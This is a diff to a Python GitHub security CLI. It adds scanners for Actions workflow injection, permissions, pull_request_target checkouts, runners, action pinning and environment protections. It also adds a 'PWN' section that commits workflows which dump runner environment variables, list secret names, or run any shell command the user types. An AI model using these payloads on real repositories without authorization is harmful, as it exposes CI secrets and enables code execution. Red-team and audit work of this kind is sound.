@@ -8,10 +8,14 @@ and prints results directly to the terminal.
 import difflib
 import json
 import os
+import re
 import shutil
 import subprocess
 import tempfile
+import time
 from datetime import timezone
+
+import yaml
 
 from github import Github, GithubException
 import requests
@@ -2262,3 +2266,610 @@ def _handle_rate_limit(client: Github, exc: GithubException) -> None:
     except Exception:
         msg = exc.data.get("message", str(exc))
         print(f"\n  {err(f'GitHub error ({exc.status}): {msg}')}\n")
+
+
+def _get_workflow_files(repo) -> list:
+    """Return (filename, raw_text, parsed_yaml) for every workflow file in .github/workflows/."""
+    try:
+        contents = repo.get_contents(".github/workflows")
+    except GithubException:
+        return []
+    if not isinstance(contents, list):
+        contents = [contents]
+    results = []
+    for f in contents:
+        if not f.name.endswith((".yml", ".yaml")):
+            continue
+        try:
+            raw = f.decoded_content.decode("utf-8")
+            parsed = yaml.safe_load(raw) or {}
+            results.append((f.name, raw, parsed))
+        except Exception:
+            continue
+    return results
+
+
+def _get_triggers(parsed: dict) -> set:
+    """Normalize the `on:` block from workflow YAML into a set of trigger names."""
+    # PyYAML parses bare `on` key as Python boolean True
+    on_val = parsed.get("on") or parsed.get(True)
+    if isinstance(on_val, str):
+        return {on_val}
+    if isinstance(on_val, list):
+        return set(on_val)
+    if isinstance(on_val, dict):
+        return set(on_val.keys())
+    return set()
+
+
+# ---------------------------------------------------------------------------
+# RECON — GitHub Actions security features
+# ---------------------------------------------------------------------------
+
+_INJECTION_SOURCES = re.compile(
+    r'\$\{\{[^}]*github\.event\.(issue\.title|issue\.body|'
+    r'pull_request\.(title|body|head\.ref|head\.label|head\.repo\.full_name)|'
+    r'comment\.body|discussion\.(title|body)|review\.body|review_comment\.body|'
+    r'head_commit\.(message|author\.email|author\.name))[^}]*\}\}'
+)
+_DANGEROUS_TRIGGERS = {
+    "pull_request_target", "issues", "issue_comment",
+    "discussion", "discussion_comment", "workflow_run",
+}
+
+
+def scan_workflow_injection(client: Github) -> None:
+    """Scan all repos for GitHub Actions workflow expression injection vulnerabilities."""
+    print(f"\n{cyan}Scanning workflows for expression injection...{reset}\n")
+    try:
+        repos = list(client.get_user().get_repos())
+    except GithubException as e:
+        _handle_rate_limit(client, e)
+        return
+
+    total_findings = 0
+    for repo in repos:
+        workflow_files = _get_workflow_files(repo)
+        repo_findings = []
+        for filename, _raw, parsed in workflow_files:
+            triggers = _get_triggers(parsed)
+            is_dangerous = bool(triggers & _DANGEROUS_TRIGGERS)
+            jobs = parsed.get("jobs") or {}
+            if not isinstance(jobs, dict):
+                continue
+            for job_id, job in jobs.items():
+                if not isinstance(job, dict):
+                    continue
+                steps = job.get("steps") or []
+                for i, step in enumerate(steps):
+                    if not isinstance(step, dict):
+                        continue
+                    run_val = step.get("run")
+                    if not run_val:
+                        continue
+                    run_str = str(run_val)
+                    matches = _INJECTION_SOURCES.findall(run_str)
+                    if not matches:
+                        continue
+                    severity = "HIGH" if is_dangerous else "MEDIUM"
+                    severity_color = red if severity == "HIGH" else yellow
+                    step_name = step.get("name") or f"step {i + 1}"
+                    trigger_str = ", ".join(sorted(triggers)) if triggers else "unknown"
+                    repo_findings.append((filename, job_id, step_name, trigger_str, severity, severity_color, run_str, matches))
+
+        if repo_findings:
+            total_findings += len(repo_findings)
+            visibility = "private" if repo.private else "public"
+            print(f"  {bold}{cyan}{repo.full_name}{reset}  {dim}[{visibility}]{reset}")
+            last_file = None
+            for filename, job_id, step_name, trigger_str, severity, scolor, run_str, matches in repo_findings:
+                if filename != last_file:
+                    print(f"    {dim}workflow:{reset} {filename}")
+                    last_file = filename
+                print(f"      {dim}Job:{reset} {job_id}  {dim}|  Step:{reset} {step_name}  {dim}|  Trigger:{reset} {trigger_str}  [{scolor}{bold}{severity}{reset}]")
+                # Show first match inline, truncated
+                first_run_line = run_str.split("\n")[0]
+                print(f"        {dim}run:{reset}   {_truncate(first_run_line, 80)}")
+                print(f"        {dim}match:{reset} {yellow}{matches[0]}{reset}")
+            print()
+
+    if total_findings == 0:
+        print(f"  {success('No workflow injection vulnerabilities found.')}\n")
+    else:
+        print(f"  {warn(f'{total_findings} injection point(s) found across repos.')}\n")
+
+
+def audit_actions_permissions(client: Github) -> None:
+    """Audit GitHub Actions workflow-level permission declarations across all repos."""
+    print(f"\n{cyan}Auditing Actions workflow permissions...{reset}\n")
+    try:
+        repos = list(client.get_user().get_repos())
+    except GithubException as e:
+        _handle_rate_limit(client, e)
+        return
+
+    total_findings = 0
+    col_w = [30, 30, 22, 10]
+
+    for repo in repos:
+        workflow_files = _get_workflow_files(repo)
+        rows = []
+        for filename, _raw, parsed in workflow_files:
+            triggers = _get_triggers(parsed)
+            has_prt = "pull_request_target" in triggers
+            perms = parsed.get("permissions")
+
+            if perms == "write-all":
+                label_str = "write-all"
+                severity = "CRITICAL" if has_prt else "HIGH"
+            elif perms is None:
+                label_str = "none declared"
+                severity = "CRITICAL" if has_prt else "MEDIUM"
+            else:
+                continue
+
+            trigger_str = ", ".join(sorted(triggers))[:28] if triggers else "—"
+            rows.append((filename, trigger_str, label_str, severity))
+
+        if rows:
+            total_findings += len(rows)
+            visibility = "private" if repo.private else "public"
+            print(f"  {bold}{cyan}{repo.full_name}{reset}  {dim}[{visibility}]{reset}")
+            header_row = f"    {'Workflow':<{col_w[0]}} {'Trigger(s)':<{col_w[1]}} {'Permissions':<{col_w[2]}} {'Severity'}"
+            print(header_row)
+            print(f"    {'─' * (sum(col_w) + 4)}")
+            for wf, trig, perm, sev in rows:
+                sev_color = red if sev == "CRITICAL" else (yellow if sev == "HIGH" else magenta)
+                print(f"    {wf:<{col_w[0]}} {trig:<{col_w[1]}} {perm:<{col_w[2]}} [{sev_color}{bold}{sev}{reset}]")
+            print()
+
+    if total_findings == 0:
+        print(f"  {success('No permission issues found.')}\n")
+    else:
+        print(f"  {warn(f'{total_findings} workflow(s) with risky permissions.')}\n")
+
+
+_DANGEROUS_CHECKOUT_REF = re.compile(
+    r'\$\{\{[^}]*(github\.event\.pull_request\.head\.(ref|sha)|'
+    r'github\.event\.pull_request\.head\.repo\.full_name)[^}]*\}\}'
+)
+
+
+def scan_pull_request_target(client: Github) -> None:
+    """Scan for dangerous pull_request_target + attacker-controlled checkout patterns."""
+    print(f"\n{cyan}Scanning for pull_request_target danger patterns...{reset}\n")
+    try:
+        repos = list(client.get_user().get_repos())
+    except GithubException as e:
+        _handle_rate_limit(client, e)
+        return
+
+    total_findings = 0
+    for repo in repos:
+        workflow_files = _get_workflow_files(repo)
+        repo_findings = []
+        for filename, _raw, parsed in workflow_files:
+            triggers = _get_triggers(parsed)
+            if "pull_request_target" not in triggers:
+                continue
+            jobs = parsed.get("jobs") or {}
+            if not isinstance(jobs, dict):
+                continue
+            for job_id, job in jobs.items():
+                if not isinstance(job, dict):
+                    continue
+                for i, step in enumerate(job.get("steps") or []):
+                    if not isinstance(step, dict):
+                        continue
+                    uses = step.get("uses", "")
+                    if not (isinstance(uses, str) and uses.startswith("actions/checkout")):
+                        continue
+                    step_with = step.get("with") or {}
+                    ref_val = str(step_with.get("ref", ""))
+                    repo_val = str(step_with.get("repository", ""))
+                    for field, fval in (("ref", ref_val), ("repository", repo_val)):
+                        if _DANGEROUS_CHECKOUT_REF.search(fval):
+                            step_name = step.get("name") or f"step {i + 1}"
+                            repo_findings.append((filename, job_id, step_name, field, fval))
+
+        if repo_findings:
+            total_findings += len(repo_findings)
+            visibility = "private" if repo.private else "public"
+            print(f"  {bold}{cyan}{repo.full_name}{reset}  {dim}[{visibility}]{reset}")
+            for filename, job_id, step_name, field, fval in repo_findings:
+                print(f"    {dim}workflow:{reset} {filename}  {dim}job:{reset} {job_id}  {dim}step:{reset} {step_name}")
+                print(f"      [{red}{bold}CRITICAL{reset}]  checkout {field}: {red}{fval}{reset}")
+            print()
+
+    if total_findings == 0:
+        print(f"  {success('No pull_request_target danger patterns found.')}\n")
+    else:
+        print(f"  {warn(f'{total_findings} dangerous checkout(s) found — CRITICAL severity.')}\n")
+
+
+def scan_self_hosted_runners(client: Github) -> None:
+    """Detect self-hosted runner usage via workflow files and registered runner API."""
+    print(f"\n{cyan}Detecting self-hosted runner usage...{reset}\n")
+    try:
+        repos = list(client.get_user().get_repos())
+    except GithubException as e:
+        _handle_rate_limit(client, e)
+        return
+
+    any_found = False
+    for repo in repos:
+        workflow_refs = []
+        for filename, _raw, parsed in _get_workflow_files(repo):
+            jobs = parsed.get("jobs") or {}
+            if not isinstance(jobs, dict):
+                continue
+            for job_id, job in jobs.items():
+                if not isinstance(job, dict):
+                    continue
+                runs_on = job.get("runs-on", "")
+                runs_on_str = " ".join(runs_on) if isinstance(runs_on, list) else str(runs_on)
+                if "self-hosted" in runs_on_str:
+                    workflow_refs.append((filename, job_id, runs_on_str))
+
+        registered = []
+        try:
+            for runner in repo.get_self_hosted_runners():
+                labels = [lbl_obj.get("name", "") if isinstance(lbl_obj, dict) else str(lbl_obj)
+                          for lbl_obj in (runner.labels or [])]
+                registered.append((runner.name, getattr(runner, "os", "?"), runner.status,
+                                    getattr(runner, "busy", False), labels))
+        except GithubException:
+            pass
+
+        if not workflow_refs and not registered:
+            continue
+
+        any_found = True
+        visibility = "private" if repo.private else "public"
+        print(f"  {bold}{cyan}{repo.full_name}{reset}  {dim}[{visibility}]{reset}")
+        if registered:
+            print(f"    {dim}Registered runners: {len(registered)}{reset}")
+            for name, os_str, status, busy, labels in registered:
+                status_color = red if status == "online" else yellow
+                label_str = ", ".join(labels)
+                print(f"      {status_color}{name}{reset}  {dim}{os_str}  {status}  busy={busy}  [{label_str}]{reset}")
+        if workflow_refs:
+            print(f"    {dim}Workflow references:{reset}")
+            for filename, job_id, runs_on_str in workflow_refs:
+                print(f"      {filename}  {dim}->{reset}  Job: {job_id}  {dim}->{reset}  runs-on: {yellow}{runs_on_str}{reset}")
+        print()
+
+    if not any_found:
+        print(f"  {success('No self-hosted runner usage found.')}\n")
+
+
+_SHA_PIN = re.compile(r'^[^@]+@[0-9a-f]{40}$')
+_MUTABLE_BRANCH = re.compile(r'@(main|master|latest|head)$', re.IGNORECASE)
+_SEMVER_MAJOR_ONLY = re.compile(r'@v\d+$')
+
+
+def _action_severity(uses: str) -> str:
+    if _SHA_PIN.match(uses):
+        return "OK"
+    tag = uses.split("@")[1] if "@" in uses else ""
+    if _MUTABLE_BRANCH.search(uses):
+        return "HIGH"
+    if _SEMVER_MAJOR_ONLY.search(uses):
+        return "MEDIUM"
+    if tag:
+        return "LOW"
+    return "MEDIUM"
+
+
+def audit_actions_pinning(client: Github) -> None:
+    """Audit third-party Actions for SHA pinning — unpinned tags are a supply chain risk."""
+    print(f"\n{cyan}Auditing Actions SHA pinning...{reset}\n")
+    try:
+        repos = list(client.get_user().get_repos())
+    except GithubException as e:
+        _handle_rate_limit(client, e)
+        return
+
+    total_unpinned = 0
+    for repo in repos:
+        repo_rows = []
+        for filename, _raw, parsed in _get_workflow_files(repo):
+            jobs = parsed.get("jobs") or {}
+            if not isinstance(jobs, dict):
+                continue
+            for job_id, job in jobs.items():
+                if not isinstance(job, dict):
+                    continue
+                for i, step in enumerate(job.get("steps") or []):
+                    if not isinstance(step, dict):
+                        continue
+                    uses = step.get("uses")
+                    if not uses or not isinstance(uses, str):
+                        continue
+                    if uses.startswith("./") or uses.startswith(".github/"):
+                        continue
+                    sev = _action_severity(uses)
+                    step_name = step.get("name") or f"step {i + 1}"
+                    repo_rows.append((filename, job_id, step_name, uses, sev))
+
+        unpinned = [(f, j, s, u, sv) for f, j, s, u, sv in repo_rows if sv != "OK"]
+        if not unpinned:
+            continue
+
+        total_unpinned += len(unpinned)
+        visibility = "private" if repo.private else "public"
+        pinned_count = len(repo_rows) - len(unpinned)
+        print(f"  {bold}{cyan}{repo.full_name}{reset}  {dim}[{visibility}]  ({len(repo_rows)} actions, {pinned_count} pinned, {len(unpinned)} unpinned){reset}")
+        for filename, job_id, step_name, uses, sev in unpinned:
+            sev_color = red if sev == "HIGH" else (yellow if sev == "MEDIUM" else dim)
+            print(f"    [{sev_color}{sev:<6}{reset}]  {uses}  {dim}({filename} / {job_id} / {step_name}){reset}")
+        print()
+
+    if total_unpinned == 0:
+        print(f"  {success('All Actions are SHA-pinned.')}\n")
+    else:
+        print(f"  {warn(f'{total_unpinned} unpinned action(s) found.')}\n")
+
+
+def audit_environment_protection(client: Github) -> None:
+    """Audit GitHub deployment environments for missing required reviewer and wait-timer protections."""
+    print(f"\n{cyan}Auditing deployment environment protection rules...{reset}\n")
+    try:
+        repos = list(client.get_user().get_repos())
+    except GithubException as e:
+        _handle_rate_limit(client, e)
+        return
+
+    any_found = False
+    col_w = [22, 22, 12, 12]
+    for repo in repos:
+        try:
+            envs = list(repo.get_environments())
+        except GithubException:
+            continue
+        if not envs:
+            continue
+
+        env_rows = []
+        for env in envs:
+            rules = env.protection_rules or []
+            rule_types = {r.type for r in rules}
+            has_reviewers = "required_reviewers" in rule_types
+            wait_rules = [r for r in rules if r.type == "wait_timer"]
+            wait_mins = next((getattr(r, "wait_timer", 0) for r in wait_rules), 0)
+            has_wait = wait_mins and wait_mins > 0
+
+            if not rules:
+                severity = "HIGH"
+            elif not has_reviewers and not has_wait:
+                severity = "HIGH"
+            elif not has_reviewers:
+                severity = "MEDIUM"
+            else:
+                severity = "OK"
+
+            if severity == "OK":
+                continue
+
+            reviewer_str = "yes" if has_reviewers else "no"
+            wait_str = f"{wait_mins} min" if has_wait else "none"
+            rule_str = ", ".join(sorted(rule_types)) if rule_types else "none"
+            env_rows.append((env.name, rule_str, reviewer_str, wait_str, severity))
+
+        if not env_rows:
+            continue
+
+        any_found = True
+        visibility = "private" if repo.private else "public"
+        print(f"  {bold}{cyan}{repo.full_name}{reset}  {dim}[{visibility}]  ({len(envs)} environment(s)){reset}")
+        print(f"    {'Environment':<{col_w[0]}} {'Protection Rules':<{col_w[1]}} {'Reviewers':<{col_w[2]}} {'Wait Timer':<{col_w[3]}} Severity")
+        print(f"    {'─' * (sum(col_w) + 14)}")
+        for env_name, rule_str, rev_str, wait_str, sev in env_rows:
+            sev_color = red if sev == "HIGH" else yellow
+            print(f"    {env_name:<{col_w[0]}} {rule_str:<{col_w[1]}} {rev_str:<{col_w[2]}} {wait_str:<{col_w[3]}} [{sev_color}{bold}{sev}{reset}]")
+        print()
+
+    if not any_found:
+        print(f"  {success('All environments have adequate protection rules (or no environments found).')}\n")
+
+
+# ---------------------------------------------------------------------------
+# PWN — Actions and repo manipulation
+# ---------------------------------------------------------------------------
+
+_PAYLOAD_EXFIL_ENV = """\
+name: bamf-red-team-test
+on: {trigger}
+jobs:
+  exfil:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Dump runner environment
+        run: |
+          echo "=== Runner Info ==="
+          echo "Runner: $RUNNER_NAME"
+          echo "OS: $RUNNER_OS"
+          echo "Actor: $GITHUB_ACTOR"
+          echo "Ref: $GITHUB_REF"
+          echo "=== Environment Variables ==="
+          env | sort
+"""
+
+_PAYLOAD_EXFIL_SECRETS = """\
+name: bamf-red-team-test
+on: {trigger}
+jobs:
+  exfil:
+    runs-on: ubuntu-latest
+    steps:
+      - name: List available secret names
+        env:
+          SECRETS_CONTEXT: ${{{{ toJSON(secrets) }}}}
+        run: |
+          echo "Available secrets (names only — values are masked by GitHub):"
+          echo "$SECRETS_CONTEXT" | python3 -c "
+          import sys, json
+          d = json.load(sys.stdin)
+          [print(' -', k) for k in d.keys()]
+          "
+"""
+
+
+def pwn_inject_workflow(client: Github) -> None:
+    """Create a test workflow file in a repo for authorized red team testing."""
+    print(f"\n{red}{bold}┌────────────────────────────────────────────────────────────────────┐{reset}")
+    print(f"{red}{bold}│  WARNING: AUTHORIZED RED TEAM USE ONLY                             │{reset}")
+    print(f"{red}{bold}│  This will create a real workflow file in a real repository.       │{reset}")
+    print(f"{red}{bold}│  Only proceed if you have written authorization to test this repo. │{reset}")
+    print(f"{red}{bold}└────────────────────────────────────────────────────────────────────┘{reset}\n")
+
+    try:
+        user = client.get_user()
+        repos = [r for r in user.get_repos() if r.permissions and r.permissions.push]
+    except GithubException as e:
+        _handle_rate_limit(client, e)
+        return
+
+    if not repos:
+        print(f"  {err('No repos with push access found.')}\n")
+        return
+
+    print(f"  {cyan}Select target repo:{reset}\n")
+    for i, r in enumerate(repos, 1):
+        visibility = "private" if r.private else "public"
+        print(f"  [{i}] {r.full_name}  {dim}[{visibility}]{reset}")
+    print()
+    choice = input("  Enter number: ").strip()
+    if not choice.isdigit() or not (1 <= int(choice) <= len(repos)):
+        print(f"  {err('Invalid selection.')}\n")
+        return
+    target_repo = repos[int(choice) - 1]
+
+    print(f"\n  {cyan}Select payload:{reset}\n")
+    print(f"  [1] Dump runner environment (env vars, actor, ref)")
+    print(f"  [2] List secret names (values masked by GitHub)")
+    print(f"  [3] Custom shell command")
+    print()
+    payload_choice = input("  Enter number: ").strip()
+
+    if payload_choice == "1":
+        payload_template = _PAYLOAD_EXFIL_ENV
+    elif payload_choice == "2":
+        payload_template = _PAYLOAD_EXFIL_SECRETS
+    elif payload_choice == "3":
+        cmd = input("  Enter shell command: ").strip()
+        if not cmd:
+            print(f"  {err('No command entered.')}\n")
+            return
+        payload_template = (
+            "name: bamf-red-team-test\non: {trigger}\njobs:\n  custom:\n"
+            "    runs-on: ubuntu-latest\n    steps:\n      - name: Custom command\n"
+            f"        run: |\n          {cmd}\n"
+        )
+    else:
+        print(f"  {err('Invalid selection.')}\n")
+        return
+
+    print(f"\n  {cyan}Select trigger:{reset}\n")
+    print(f"  [1] workflow_dispatch  (manual — safest for testing)")
+    print(f"  [2] push")
+    print(f"  [3] pull_request")
+    print()
+    trigger_choice = input("  Enter number: ").strip()
+    trigger_map = {"1": "workflow_dispatch", "2": "push", "3": "pull_request"}
+    if trigger_choice not in trigger_map:
+        print(f"  {err('Invalid selection.')}\n")
+        return
+    trigger = trigger_map[trigger_choice]
+
+    content = payload_template.format(trigger=trigger)
+    timestamp = int(time.time())
+    path = f".github/workflows/bamf-test-{timestamp}.yml"
+
+    print(f"\n  {cyan}Preview:{reset}\n")
+    for line in content.splitlines():
+        print(f"  {dim}{line}{reset}")
+    print(f"\n  {yellow}Target:{reset} {target_repo.full_name}")
+    print(f"  {yellow}Path:{reset}   {path}\n")
+
+    confirm = input(f"  {red}Create this workflow file? [y/N]:{reset} ").strip().lower()
+    if confirm != "y":
+        print(f"\n  {muted('Aborted.')}\n")
+        return
+
+    try:
+        result = target_repo.create_file(path, "bamf: add red team test workflow", content)
+        created_sha = result["content"].sha
+        print(f"\n  {success('Workflow created:')} {target_repo.html_url}/blob/{target_repo.default_branch}/{path}\n")
+    except GithubException as e:
+        msg = e.data.get("message", str(e)) if hasattr(e, "data") else str(e)
+        print(f"\n  {err(f'Failed to create workflow: {msg}')}\n")
+        return
+
+    cleanup = input(f"  Delete the workflow file now? [y/N]: ").strip().lower()
+    if cleanup == "y":
+        try:
+            target_repo.delete_file(path, "bamf: remove red team test workflow", created_sha)
+            print(f"\n  {success('Workflow file deleted.')}\n")
+        except GithubException as e:
+            msg = e.data.get("message", str(e)) if hasattr(e, "data") else str(e)
+            print(f"\n  {err(f'Failed to delete workflow: {msg}')}\n")
+    else:
+        print(f"\n  {muted('Workflow file left in place.')}\n")
+
+
+def fork_repo(client: Github) -> None:
+    """Fork any accessible repository under the authenticated account."""
+    print(f"\n{cyan}Fork a repository{reset}\n")
+
+    full_name = input("  Enter repo to fork (owner/name): ").strip()
+    if full_name.count("/") != 1:
+        print(f"\n  {err('Invalid format — use owner/name (e.g. torvalds/linux).')}\n")
+        return
+
+    try:
+        source = client.get_repo(full_name)
+    except GithubException as e:
+        if e.status == 404:
+            print(f"\n  {err('Repository not found or not accessible.')}\n")
+        else:
+            _handle_rate_limit(client, e)
+        return
+
+    visibility = "private" if source.private else "public"
+    print(f"\n  {lbl('Repo:')}     {source.full_name}  [{visibility}]")
+    print(f"  {lbl('Branch:')}   {source.default_branch}")
+    desc = source.description or "—"
+    print(f"  {lbl('Desc:')}     {_truncate(desc, 60)}")
+    print(f"  {lbl('Stars:')}    {source.stargazers_count}\n")
+
+    custom_name = input("  Custom fork name? (Enter to keep original): ").strip() or None
+    branch_only_str = input("  Fork default branch only? [y/N]: ").strip().lower()
+    default_branch_only = branch_only_str == "y"
+
+    fork_target = custom_name or source.name
+    print(f"\n  {yellow}Will fork:{reset} {source.full_name}  →  {client.get_user().login}/{fork_target}")
+    if default_branch_only:
+        print(f"  {dim}(default branch only){reset}")
+    print()
+
+    confirm = input(f"  Proceed? [y/N]: ").strip().lower()
+    if confirm != "y":
+        print(f"\n  {muted('Aborted.')}\n")
+        return
+
+    try:
+        kwargs = {"default_branch_only": default_branch_only}
+        if custom_name:
+            kwargs["name"] = custom_name
+        forked = source.create_fork(**kwargs)
+        print(f"\n  {success('Fork created:')} {forked.html_url}")
+        print(f"  {dim}Clone: {forked.clone_url}{reset}")
+        print(f"\n  {muted('Note: GitHub forks are async — the fork may take a few seconds to fully initialize.')}\n")
+    except GithubException as e:
+        if e.status == 403:
+            print(f"\n  {err('Permission denied — fork restrictions may be enabled on this repo.')}\n")
+        elif e.status == 422:
+            print(f"\n  {err('Fork failed — you may already have a fork of this repo, or the name is taken.')}\n")
+        else:
+            _handle_rate_limit(client, e)
